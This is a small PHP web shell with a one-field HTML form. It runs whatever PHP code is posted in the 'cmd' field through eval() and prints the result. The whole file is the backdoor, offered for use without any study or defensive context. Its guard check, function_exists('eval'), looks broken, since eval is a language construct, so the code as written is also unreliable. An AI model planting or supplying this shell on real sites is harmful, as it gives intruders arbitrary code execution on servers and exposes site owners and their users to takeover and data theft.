<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $output = '';

    if (function_exists('eval')) {
        ob_start();
        eval($command);
        $output = ob_get_clean();
    } else {
        $output = "The 'eval' function is not enabled.";
    }

    echo $output;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Webshell (eval)</title>
</head>
<body>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a command">
        <input type="submit" value="Send">
    </form>
</body>
</html>

